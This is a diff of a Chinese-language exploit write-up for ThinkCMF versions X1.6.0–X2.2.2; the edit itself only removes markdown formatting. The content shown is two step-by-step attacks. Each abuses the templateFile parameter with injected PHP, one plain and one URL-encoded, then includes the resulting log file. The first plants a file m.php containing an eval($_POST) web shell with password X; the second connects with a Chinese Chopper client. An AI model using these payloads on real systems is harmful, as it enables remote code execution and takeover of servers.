@@ -65,16 +65,14 @@ ThinkCMF X1.6.0ThinkCMF X2.1.0ThinkCMF X2.2.0ThinkCMF X2.2.1ThinkCMF X2.2.2
 
 -   首先访问
 
-```{=html}
 <!-- -->
-```
+
     http://www.0-sec.org/?a=display&templateFile=%3C?php%20file_put_contents(%27m.php%27,%27%3C%3fphp+eval($_POST[%22X%22])%3b%3F%3E%27);die();?%3E
 
 -   然后请求
 
-```{=html}
 <!-- -->
-```
+
     http://www.0-sec.org/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.log
 
 -   即可在http://www.0-sec.org/根目录生成m.php，密码是X
@@ -83,14 +81,12 @@ ThinkCMF X1.6.0ThinkCMF X2.1.0ThinkCMF X2.2.0ThinkCMF X2.2.1ThinkCMF X2.2.2
 
 -   首先访问
 
-```{=html}
 <!-- -->
-```
+
     http://www.0-sec.org/?a=display&templateFile=%3C%3F%70%68%70%20%65%76%61%6C%28%24%5F%50%4F%53%54%5BX%5D%29%3B%3F%3E
 
 -   然后菜刀链接（密码也是x）
 
-```{=html}
 <!-- -->
-```
+
     http://www.0-sec.org/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.log
